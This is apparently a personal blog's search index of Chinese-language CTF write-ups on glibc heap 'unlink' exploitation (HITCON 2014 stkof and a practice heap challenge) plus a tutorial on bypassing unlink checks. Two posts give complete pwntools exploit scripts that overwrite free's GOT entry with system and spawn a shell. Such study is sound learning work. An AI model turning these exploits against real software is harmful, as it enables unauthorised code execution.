<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hitcon2014_stkof writeup]]></title>
    <url>%2Fpost%2Fe7616071.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2014-stkof这道题没有菜单显示，只能通过分析代码来了解程序功能。 功能： 添加（输入：长度） 修改（输入：索引、长度、内容） 删除（输入：索引） 程序保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序分析add函数中，对分配chunk的大小没有限制，将指针存到全局数组中，可获得指针变量的地址 set函数中，12345678910111213141516171819202122232425262728293031signed __int64 set()&#123; signed __int64 result; // rax int i; // eax unsigned int v2; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v2 = atol(&amp;s); if ( v2 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v2] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); n = atoll(&amp;s); ptr = ::s[v2]; for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; if ( n ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125; 对写入的长度没有限制，存在堆溢出，所以可以利用unlink漏洞 delete函数中，释放掉堆块并把指针清零0 由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数） 漏洞利用 分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并） 在chunk1中构造fake chunk，准备unlinkprevsize：0size：0x80fd：chunk_ptr - 0x18bk：chunk_ptr - 0x10注意：chunk_ptr是指向chunk0的指针变量所在的地址，而非指针指向的地址 从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）prevsize: 0x80size：0x90 释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18 把free的got表修改为puts。payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts)) 使用DynELF泄露system（详见代码） 利用（5）的方法，再将free的got表修改为system 向chunk3中写入/bin/sh\x00，释放chunk3，getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./stkof')elf = ELF('./stkof')free_got = elf.got['free']puts = elf.symbols['puts']def add(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\n')def set(index, content): p.sendline('2') p.sendline(str(index)) p.sendline(str(len(content))) p.send(content) p.recvuntil('\n')def delete(index): p.sendline('3') p.sendline(str(index))def leak(addr): payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(addr) set(1, payload) delete(2) res = p.recvuntil('OK\n').split('\x0aOK')[0] if res == '': res = '\x00' return res #返回值可以为任意长度，并不清楚原因chunk_ptr = 0x602148add(0x80)add(0x80)add(0x80)add(0x80)#unlinkpayload = p64(0) + p64(0x0)payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)payload += 'a' * 0x60payload += p64(0x80) + p64(0x90)set(1, payload)delete(2)p.recvuntil('OK\n')#freegot写为putspayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))#leakd = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#freegot写为systempayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(system))#getshellset(3, '/bin/sh\x00')delete(3)p.interactive() 相关链接题目链接：stkof相关题目：unlink例题unlink漏洞分析：堆利用学习之unlink]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>how2heap</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink例题]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。 123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exit 程序分析其中，add函数没有对申请的chunk大小做限制。在set函数中：123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125; 可以发现代码中没有对写入的长度做限制，存在溢出同时，buf[]中储存指向chunk的指针，且为全局变量，可以获得地址由此确定程序中存在unlink漏洞 在delete函数中：123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125; 释放chunk后没有对指针赋0，会造成UAF漏洞，但此题不会利用到。 在print函数中，可输出任意index的chunk，用于泄露数据。 由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读 漏洞利用 分配3个连续的chunk，大小为0x80（smallchunk）chunk0、chunk1: 用于构造unlinkchunk2：用于防止被top chunk合并 在chunk0中构造fake chunk，准备unlink。prevsize：0size：0x80fd：chunk_ptr - 0xcbk：chunk_ptr - 0x8注意：chunk_ptr是指向chunk0的指针变量所在的地址，即&amp;buf[0]，而非指针指向的地址 从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）prevsize: 0x80size：0x88 释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc 写入chunk0，构造leak函数，准备利用DynELF来泄露system，由于指针被修改，实际写入地址是chunk_ptr-0xc。payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用payload += p32(addr) //将addr写入chunk1的指针(buf[1])此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取 利用DynELF泄露出system函数地址 利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将system的地址写入free的got表 向chunk2中写入&#39;/bin/sh\x00&#39;，调用free(chunk2)，因为free被覆盖为system，所以实际调用system(chunk2)，成功getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#free第二个chunk，将会触发unlinkdelete_chunk(1)#泄露system的地址d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#将free_got的地址覆盖掉第二个chunk的地址payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址set_chunk(1, p32(system))#调用free，实际调用systemdelete_chunk(2)p.interactive() 注意 set_chunk函数中最后应该用send而非sendline，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。 unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值 此题为32位程序，若是64位应将p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)改为p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10) 相关链接题目链接：heapHITCON CTF 2014-stkof]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[原理unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。 源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* Take a chunk off a bin list */// unlink p#define unlink(AV, P, BK, FD) &#123; // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd; BK = P-&gt;bk; // 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。 if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P, AV); else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; // 下面主要考虑 P 对应的 nextsize 双向链表的修改 if (!in_smallbin_range (chunksize_nomask (P)) // 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。 // 那么其实也就没有必要对 nextsize 字段进行修改了。 // 这里没有去判断 bk_nextsize 字段，可能会出问题。 &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; // 类似于小的 chunk 的检查思路 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, "corrupted double-linked list (not small)", P, AV); // 这里说明 P 已经在 nextsize 链表中了。 // 如果 FD 没有在 nextsize 链表中 if (FD-&gt;fd_nextsize == NULL) &#123; // 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P // 令 FD 为 nextsize 串起来的 if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; // 否则我们需要将 FD 插入到 nextsize 形成的双链表中 FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; // 如果在的话，直接拿走即可 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125; &#125; 其中主要关注这部分：1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125; 要利用该漏洞，先要绕过其中的if检查（64位为例）第一处检查chunksize(P) != prev_size (next_chunk(P))需要构造好下一相邻chunk的presize第二处检查：12345678P-&gt;bk-&gt;fd == P // *(P+0x18)+0x10 == P// =&gt; *(P+0x18) = P-0x10 // =&gt; P-&gt;bk == P-0x10// =&gt; BK == P-0x10P-&gt;fd-&gt;bk == P // *(P+0x10)+0x18 == P// =&gt; *(P+0x10) = P-0x18// =&gt; P-&gt;fd == P-0x18// =&gt; FD == p-0x18 可以看出，只要在fd处放入P-0x18，在bk处放入P-0x10即可绕过检查。绕过检查后：12FD-&gt;bk = BK; // *(FD+0x18) = P-0x10BK-&gt;fd = FD; // *(BK+0x10) = P-0x18 =&gt; *P = P-0x18 在此之后，P就指向了比自己低0x18个字节的地址，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。 触发前提 堆指针是全局变量，或其地址是可泄露的 能够free一个smallchunk(可以是伪造的)(largebin增加对fd_nextsize和bk_nextsize检查，unsortedbin没有检查) 能够控制下一chunk的prevsize和size 利用过程（64位为例）法一存在堆溢出时： 分配连续3个chunk a, b, c 在a中伪造chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding 覆盖b的prevsize和size，修改inuse位，使之可以与a合并p64(0x80) + p64(0x90) free掉b，触发unlink 写入a，覆盖指针为任意地址，p64(0)*3 + p64(addr) 再次写入a，任意地址写入 法二不能溢出，但有double free 分配连续3个fastchunk a, b, c 释放a，此时并不会修改后面的inuse位和prevsize 申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改 触发double free，将a再次释放，放入fastbin 再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse 布置a内存，释放b，触发unlink 题目 一道典型的unlink例题 HITCON CTF 2014-stkof]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[这是一个测试1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
